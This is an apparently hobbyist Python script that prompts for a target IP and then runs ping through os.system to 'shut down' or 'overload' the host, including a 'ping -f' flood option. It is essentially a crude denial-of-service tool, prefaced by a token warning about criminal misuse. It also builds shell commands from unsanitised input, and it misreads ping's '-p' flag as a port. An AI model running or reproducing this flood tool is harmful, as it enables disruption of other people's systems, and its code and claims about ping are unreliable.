#Programed By:Steven M

#Please Use this program properly using it
#improperly can be a criminal offence

print("Please Use this program properly using it improperly can be a criminal offence \n")

print()

print("DO NOT COPPY CODE")
print("CODE BY: Steven M")

print()

print()

print("Enter IP \n")
myHost=input()

print()
print('What port do you want to test   "if you dont know do 80" ')
myPort=input()

print()
print('What do you want the filesize to be   "if you dont know do 120" ')
myFilesize=input()

print("Do you want to try IP-Shutdown or use -f \n")
power = float(input("1 = yes / 2 = no /3 = -f \n"))
if power == 1:
        
        print('How many packets do you want to send   "Higher Number Longer Time" ')
        myPacket=input()
        
        print("Do you want to proceed with the ping on IP: " + myHost )

        weight = float(input("1 = yes / 2 = no \n"))
        if weight == 1:

                print("Starting to Send files this may take a bit")


                import os
                hostname = ("ping -c %s -p %s -s %s %s") %(myPacket, myPort, myFilesize, myHost)
                response = os.system(hostname)

                if response == 0:
                        print (myHost + " is online failed to Ping-Shutdown")

                else:
                        print (myHost + " is offline")

        if weight == 2:
                print("ping-overload terminated")

if power == 2:
        print("Do you want to proceed with the ping on IP: " + myHost )

        weight = float(input("1 = yes / 2 = no \n"))
        if weight == 1:

                import os
                hostname = "ping -c 1 -p %s -s %s %s" %(myPort, myFilesize, myHost)
                response = os.system(hostname)

                if response == 0:
                        print (myHost + " is online")

                else:
                        print (myHost + " is offline")

        if weight == 2:
                print("ping-overload terminated")

if power == 3:
        print("Do you want to proceed with the ping on IP: " + myHost )

        weight = float(input("1 = yes / 2 = no \n"))
        if weight == 1:

                import os
                hostname = ("ping -f " + myHost)
                response = os.system(hostname)

                if response == 0:
                        print (myHost + " is online")

                else:
                        print (myHost + " is offline")

        if weight == 2:
                print("ping-overload terminated")
